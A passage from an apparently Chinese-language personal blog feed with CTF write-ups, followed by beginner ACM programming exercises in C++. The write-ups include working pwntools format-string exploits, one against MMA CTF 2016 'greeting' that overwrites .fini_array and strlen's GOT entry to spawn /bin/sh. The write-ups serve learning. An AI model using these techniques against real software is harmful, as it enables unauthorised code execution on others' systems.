class="built_in">..</span></span><br><span class="line">Sorry,<span class="built_in"> secret </span>= 0      </span><br><span class="line"><span class="comment">#可以看到栈偏移为  8</span></span><br></pre></td></tr></table></figure><blockquote><p>secret_addr：000000000060107C （ida中双击secret即可找到）<br>因为是64位程序，我们将被更改的地址（secret）放在最后面，偏移加1：  </p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">%192</span><span class="keyword">c</span><span class="symbol">%9</span>$lln\<span class="keyword">x</span><span class="number">7</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">10</span>\<span class="keyword">x</span><span class="number">60</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span></span><br></pre></td></tr></table></figure><blockquote><p>然而<br><img src="https://s2.ax1x.com/2019/11/24/MOvMid.png" alt="MOvMid.png"><br>所以我们再钱买你再补四个字符，导致偏移再次加 1   偏移为 10</p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa<span class="symbol">%188</span><span class="keyword">c</span><span class="symbol">%10</span>$lln\<span class="keyword">x</span><span class="number">7</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">10</span>\<span class="keyword">x</span><span class="number">60</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/24/MOvQJA.png" alt="MOvQJA.png"></p><h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level='debug'</span><br><span class="line">io = process('./format1')</span><br><span class="line"></span><br><span class="line">offset = 8</span><br><span class="line">secret_addr=0x000000000060107C</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"aaaa%188c%10$lln\x7c\x10\x60\x00\x00\x00\x00\x00"</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/24/MOvuIH.png" alt="MOvuIH.png"></p><blockquote><p>只有本地，成功打通！<br><img src="https://s2.ax1x.com/2019/11/17/MsBbCQ.jpg" alt="MsBbCQ.jpg"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;64位elf程序，这个应该是个很基础的  格式化字符串程序，&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>MMA CTF 2nd 2016-greeting</title>
    <link href="http://yoursite.com/2019/11/24/MMA%20CTF%202nd%202016-greeting/"/>
    <id>http://yoursite.com/2019/11/24/MMA CTF 2nd 2016-greeting/</id>
    <published>2019-11-24T09:58:31.000Z</published>
    <updated>2019-11-24T09:59:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>32位elf程序，这里面这个函数：sprintf(&amp;s, “Nice to meet you, %s :)\n”, &amp;v5);（我在这栽了2多小时！）要注意在下面的printf函数解析s的时候 格式化字符串前面已经含有了‘“Nice to meet you, ’18个字符！具体看下面就好！</p><a id="more"></a><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考链接<span class="number">1</span>：https://bbs.ichunqiu.com/thread<span class="number">-42943</span><span class="number">-1</span><span class="number">-1</span>.html?from=beef</span><br><span class="line">参考链接<span class="number">2</span>：http://www.mart<span class="number">1</span>n.top/<span class="number">2019</span>/<span class="number">02</span>/<span class="number">27</span>/<span class="symbol">%E5</span><span class="symbol">%AD</span><span class="symbol">%97</span><span class="symbol">%E7</span><span class="symbol">%AC</span><span class="symbol">%A6</span><span class="symbol">%E4</span><span class="symbol">%B8</span><span class="symbol">%B2</span><span class="symbol">%E6</span><span class="symbol">%A0</span><span class="symbol">%BC</span><span class="symbol">%E5</span><span class="symbol">%BC</span><span class="symbol">%8</span>F<span class="symbol">%E5</span><span class="symbol">%8</span>C<span class="symbol">%96</span><span class="symbol">%E6</span><span class="symbol">%BC</span><span class="symbol">%8</span>F<span class="symbol">%E6</span><span class="symbol">%B4</span><span class="symbol">%9</span>E<span class="symbol">%E7</span><span class="symbol">%9</span>A<span class="symbol">%84</span><span class="symbol">%E5</span><span class="symbol">%88</span><span class="symbol">%A9</span><span class="symbol">%E7</span><span class="symbol">%94</span><span class="symbol">%A8</span>/</span><br><span class="line">参考链接<span class="number">3</span>：https://xiaoxiaorenwu.top/<span class="number">2019</span>/<span class="number">03</span>/<span class="number">31</span>/<span class="symbol">%E5</span><span class="symbol">%AF</span><span class="symbol">%92</span><span class="symbol">%E5</span><span class="symbol">%81</span><span class="symbol">%87</span><span class="symbol">%E5</span><span class="symbol">%B0</span><span class="symbol">%8</span>F<span class="symbol">%E7</span><span class="symbol">%BB</span><span class="symbol">%93</span>/</span><br></pre></td></tr></table></figure><h1 id="MMA-CTF-2nd-2016-greeting"><a href="#MMA-CTF-2nd-2016-greeting" class="headerlink" title="MMA CTF 2nd 2016-greeting"></a>MMA CTF 2nd 2016-greeting</h1><blockquote><p>查看属性和保护：</p></blockquote><ol><li><p>$ file greeting</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">greeting:</span> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib/ld-,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.24</span><span class="string">,</span> <span class="string">BuildID[sha1]=beb85611dbf6f1f3a943cecd99726e5e35065a63,</span> <span class="string">not</span> <span class="string">stripped</span></span><br></pre></td></tr></table></figure></li><li><p>checksec greeting</p></li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="literal">No</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure><blockquote><p>拖入ida：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5Ch] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please tell me your name... "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !getnline(&amp;v5, <span class="number">64</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Don't ignore me ;( "</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"Nice to meet you, %s :)\n"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="comment">//这里存在 很明显的  格式化字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们进去getnline函数：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> __<span class="function">cdecl <span class="title">getnline</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  fgets(s, n, <span class="built_in">stdin</span>);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>程序大概就是我们输入等于64 个字符 到v5中，然后 将”Nice to meet you, “+我们输入的64个字符+ “:)\n”  复制到s中！</p></blockquote><h1 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在<span class="selector-tag">main</span>函数前会调用<span class="selector-class">.init</span>段代码和<span class="selector-class">.init_array</span>段的函数数组中每一个函数指针。</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">main</span>函数结束后也会调用<span class="selector-class">.fini</span>段代码和<span class="selector-class">.fini</span><span class="selector-class">._arrary</span>段的函数数组中的每一个函数指针。</span><br></pre></td></tr></table></figure><ol><li>为了程序重新运行，我们将.fini_array数组的第一个元素为start地址</li><li>因为当执行过start地址后，.fini_array数组的第一个元素将不再是start地址，所以我们在将程序重新执行后，我们需要将执行过程中的一个函数的got地址改成system的plt地址，然后第二次就直接输入/bin/sh\x00   拿shell了<h4 id="测偏移：12"><a href="#测偏移：12" class="headerlink" title="测偏移：12"></a>测偏移：12</h4><blockquote><p>首先 输入 aaaa%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..</p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, I'm nao!</span><br><span class="line">Please tell me your name... aaaa<span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span></span><br><span class="line">Nice <span class="keyword">to</span> meet you, aaaa<span class="number">0x80487d0</span>..<span class="number">0xffa5f54c</span>..(nil)..(nil)..(nil)..(nil)..<span class="number">0x6563694e</span>..<span class="number">0x206f7420</span>..<span class="number">0x7465656d</span>..<span class="number">0x756f7920</span>..<span class="number">0x6161202c</span>..<span class="number">0x70256161</span>..<span class="number">0x70252e2e</span>..<span class="number">0x70252e2e</span>..<span class="number">0x70252e2e</span>. :)</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>发现 0x70256161  6161  是我们 的输入的a！显然没有对齐，我们在aaaa前面再加2a，于是<br>我们发送aaaaaa%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..</p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, I'm nao!</span><br><span class="line">Please tell me your name... aaaaaa<span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span></span><br><span class="line">Nice <span class="keyword">to</span> meet you, aaaaaa<span class="number">0x80487d0</span>..<span class="number">0xffb9e0bc</span>..(nil)..(nil)..(nil)..(nil)..<span class="number">0x6563694e</span>..<span class="number">0x206f7420</span>..<span class="number">0x7465656d</span>..<span class="number">0x756f7920</span>..<span class="number">0x6161202c</span>..<span class="number">0x61616161</span>..<span class="number">0x2e2e7025</span>..<span class="number">0x2e2e7025</span>..% :)#发现是<span class="number">12</span>偏移</span><br></pre></td></tr></table></figure><h1 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h1><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">conn=process('./greeting')</span><br><span class="line">elf=ELF('./greeting')</span><br><span class="line">fini_array=0x08049934         <span class="comment">#readelf -S greeting</span></span><br><span class="line">start=0x080484f0          <span class="comment">#   ida  看的更方便嘛！</span></span><br><span class="line">system_plt=0x8048490         </span><br><span class="line">strlen_got=elf.got['strlen'] </span><br><span class="line"><span class="comment">#print "strlen_got: "+hex(strlen_got)</span></span><br><span class="line"><span class="comment">#print "system_plt: "+hex(system_plt)</span></span><br><span class="line"><span class="comment">#print "fini_array: "+hex(fini_array)</span></span><br><span class="line"><span class="comment">#print "start: "+hex(start)</span></span><br><span class="line">conn.recv()</span><br><span class="line">payload='aa'+p32(fini_array)+p32(strlen_got+2)  <span class="comment">#18+2+4+4</span></span><br><span class="line">payload+=p32(strlen_got)+'%34000c%12$hn'        <span class="comment">#+4+34000=0x84f0</span></span><br><span class="line">payload+='%33556c%13$hn'                    <span class="comment">#0x84f0+33556=0x10804 截断=0x0804</span></span><br><span class="line">payload+='%31884c%14$hn'                     <span class="comment">#0x10804+31884=0x18049 截断=0x8049</span></span><br><span class="line">conn.sendline(payload)  <span class="comment">#此时已 一次性将 fini_array-&gt;start   strlen_got-&gt;system_plt</span></span><br><span class="line">conn.recv()                     <span class="comment">#程序重新运行了，接受Please tell me your name... </span></span><br><span class="line">conn.sendline('/bin/sh\x00')</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>这里因为没有远程服务器，不过本地通了！也就意味了远程也Ok了!</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python greeting.py</span></span><br><span class="line">$ ls</span><br><span class="line">[<span class="builtin-name">DEBUG</span>] Sent 0x3 bytes:</span><br><span class="line">    <span class="string">'ls\n'</span></span><br><span class="line">[<span class="builtin-name">DEBUG</span>] Received 0x16 bytes:</span><br><span class="line">    <span class="string">'greeting  greeting.py\n'</span></span><br><span class="line">greeting  greeting.py</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/17/MsBTUS.jpg" alt="MsBTUS.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;32位elf程序，这里面这个函数：sprintf(&amp;amp;s, “Nice to meet you, %s :)\n”, &amp;amp;v5);（我在这栽了2多小时！）要注意在下面的printf函数解析s的时候 格式化字符串前面已经含有了‘“Nice to meet you, ’18个字符！具体看下面就好！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>备战2020ACM第一弹</title>
    <link href="http://yoursite.com/2019/11/20/%E5%A4%87%E6%88%982020ACM%E7%AC%AC%E4%B8%80%E5%BC%B9/"/>
    <id>http://yoursite.com/2019/11/20/备战2020ACM第一弹/</id>
    <published>2019-11-20T06:49:35.000Z</published>
    <updated>2019-11-20T13:47:07.291Z</updated>
    
    <content type="html"><![CDATA[<p>备战，备战！！！</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">时间限制：</span><br><span class="line">内存限制：</span><br><span class="line">题目来源：</span><br></pre></td></tr></table></figure><h1 id="小明的调查作业"><a href="#小明的调查作业" class="headerlink" title="小明的调查作业"></a>小明的调查作业</h1><h5 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h5><blockquote><p>小明的老师布置了一份调查作业，小明想在学校中请一些同学一起做一项问卷调查，聪明的小明为了实验的客观性，想利用自己的计算机知识帮助自己。他先用计算机生成了N个1到1000之间的随机整数（0&lt;N≤1000），对于其中重复的数字，只保留一个，把其余相同的数去掉，不同的数对应着不同的学生的学号。然后再把这些数从小到大排序，按照排好的顺序去找同学做调查。请你协助明明完成“去重”与“排序”的工作。</p></blockquote><h5 id="Input："><a href="#Input：" class="headerlink" title="Input："></a>Input：</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入有<span class="number">2</span>行，第<span class="number">1</span>行为<span class="number">1</span>个正整数，表示所生成的随机数的个数：N（<span class="number">0</span>&lt;N≤<span class="number">1000</span>）</span><br><span class="line">第<span class="number">2</span>行有N个用空格隔开的正整数，为所产生的随机数。</span><br></pre></td></tr></table></figure><h5 id="Output："><a href="#Output：" class="headerlink" title="Output："></a>Output：</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出也是<span class="number">2</span>行，第<span class="number">1</span>行为<span class="number">1</span>个正整数M，表示不相同的随机数的个数。第<span class="number">2</span>行为M个用空格隔开的正整数，为从小到大排好序的不相同的随机数。</span><br></pre></td></tr></table></figure><h5 id="样例输入："><a href="#样例输入：" class="headerlink" title="样例输入："></a>样例输入：</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">20</span> <span class="number">40</span> <span class="number">32</span> <span class="number">67</span> <span class="number">40</span> <span class="number">20</span> <span class="number">89</span> <span class="number">300</span> <span class="number">400</span> <span class="number">15</span></span><br></pre></td></tr></table></figure><h5 id="样例输出："><a href="#样例输出：" class="headerlink" title="样例输出："></a>样例输出：</h5><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span></span><br><span class="line"><span class="symbol">15 </span><span class="number">20</span> <span class="number">32</span> <span class="number">40</span> <span class="number">67</span> <span class="number">89</span> <span class="number">300</span> <span class="number">400</span></span><br></pre></td></tr></table></figure><h5 id="AC代码："><a href="#AC代码：" class="headerlink" title="AC代码："></a>AC代码：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000</span>],N,sum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">sort(a,a+N);<span class="comment">//头文件：#include&lt;algorithm&gt;排序，这里其实我该复习下各种排序的，忘光光了！</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i]==a[i+<span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">a[i]=<span class="number">0</span>;</span><br><span class="line">sum++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;N-sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)    <span class="comment">//去重</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i]!=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="统计单词"><a href="#统计单词" class="headerlink" title="统计单词"></a>统计单词</h1><h5 id="描述：-1"><a href="#描述：-1" class="headerlink" title="描述："></a>描述：</h5><blockquote><p>输入一个正整数repeat (0&lt;repeat&lt;10)，做repeat次下列运算：<br>输入一行字符，统计其中单词的个数。各单词之间用空格分隔，空格数可以是多个。</p></blockquote><h5 id="样例输入：注：括号内是说明"><a href="#样例输入：注：括号内是说明" class="headerlink" title="样例输入：注：括号内是说明"></a>样例输入：注：括号内是说明</h5><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>   (repeat=<span class="number">2</span>)</span><br><span class="line">Reold building  room   <span class="number">123</span></span><br><span class="line">  Programming <span class="keyword">is</span> <span class="function"><span class="keyword">fun</span></span></span><br></pre></td></tr></table></figure><h5 id="样例输出：-1"><a href="#样例输出：-1" class="headerlink" title="样例输出："></a>样例输出：</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h5 id="AC代码：-1"><a href="#AC代码：-1" class="headerlink" title="AC代码："></a>AC代码：</h5><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std; </span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;   <span class="keyword">int</span> repeat;</span><br><span class="line">    cin&gt;&gt;repeat;</span><br><span class="line">    getchar();<span class="comment">//吃掉缓冲区的  "\n" </span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;repeat;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> <span class="keyword">str</span>[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> <span class="keyword">count</span>=<span class="number">0</span>;</span><br><span class="line">        gets(<span class="keyword">str</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;<span class="keyword">str</span>[i+<span class="number">1</span>]!=<span class="string">'\0'</span>;i++)<span class="comment">//空格的后一个不是空格则 单词个数加一   这里str[0]==' ' </span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">str</span>[i]==<span class="string">' '</span>&amp;&amp;<span class="keyword">str</span>[i+<span class="number">1</span>]!=<span class="string">' '</span>)</span><br><span class="line">                <span class="keyword">count</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">str</span>[<span class="number">0</span>]!=<span class="string">' '</span>)                <span class="comment">//if   这里str[0]==' '     则第一个单词没算上   再就好加上 </span></span><br><span class="line">            <span class="keyword">count</span>++;</span><br><span class="line">        cout&lt;&lt;<span class="keyword">count</span>&lt;&lt;endl;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="任意进制转十进制"><a href="#任意进制转十进制" class="headerlink" title="任意进制转十进制"></a>任意进制转十进制</h1><h5 id="描述：-2"><a href="#描述：-2" class="headerlink" title="描述："></a>描述：</h5><blockquote><p>程序填空。要求输入一个字符串，该字符串可以是2进制、八进制、十六进制数据，再输入一个输入数据基数值，并转换成十进制输出显示，要求自定义函数实现任意进制转十进制数据。</p></blockquote><h5 id="样例输入：-1"><a href="#样例输入：-1" class="headerlink" title="样例输入："></a>样例输入：</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111111</span> <span class="number">2</span></span><br><span class="line">FF <span class="number">16</span></span><br><span class="line"><span class="number">377</span> <span class="number">8</span></span><br></pre></td></tr></table></figure><h5 id="样例输出：-2"><a href="#样例输出：-2" class="headerlink" title="样例输出："></a>样例输出：</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">255</span></span><br><span class="line"><span class="number">255</span></span><br><span class="line"><span class="number">255</span></span><br></pre></td></tr></table></figure><h5 id="AC代码：-2"><a href="#AC代码：-2" class="headerlink" title="AC代码："></a>AC代码：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 